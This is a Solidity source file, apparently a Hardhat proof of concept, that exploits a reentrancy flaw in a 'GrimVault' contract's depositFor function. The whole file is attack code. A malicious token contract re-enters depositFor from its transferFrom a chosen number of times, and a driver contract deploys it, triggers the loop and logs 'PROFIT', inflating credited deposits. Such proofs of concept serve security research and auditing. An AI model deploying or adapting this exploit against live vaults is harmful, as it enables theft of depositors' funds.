pragma solidity 0.8.4;

import "hardhat/console.sol";


interface IGrimVault {
  function depositFor(address token, uint _amount,address user ) external;
}


contract ExploitBadToken {
  uint256 public i = 0;
  uint256 public reentrancies = 0;
  address public origin;
  address public vault;
  
  constructor(address vault_) {
    vault = vault_;
  }

  function targetReentrancies(uint256 n_) public{
    i = 0;
    reentrancies = n_;
    origin = msg.sender;
  }

  function transferFrom(address from_, address to_, uint256 amount_) external returns(bool) {
    if (i < reentrancies) {
      console.log("reentrancy #", i);
      i++;
      IGrimVault(vault).depositFor(address(this), 1000, origin);
    }
    return true;
  }

}


contract ExploitGrim {
  address public token ;
  address public vault ;

  constructor(address vault_) {
    token = address(new ExploitBadToken(vault_));
    vault = vault_;
  }

  function exploit(uint256 n) public {
    console.log("deposit in vault");
    ExploitBadToken(token).targetReentrancies(n);
    IGrimVault(vault).depositFor(token, 1000, address(this) );
    console.log("withdraw from vault");
    console.log("PROFIT");
  }

}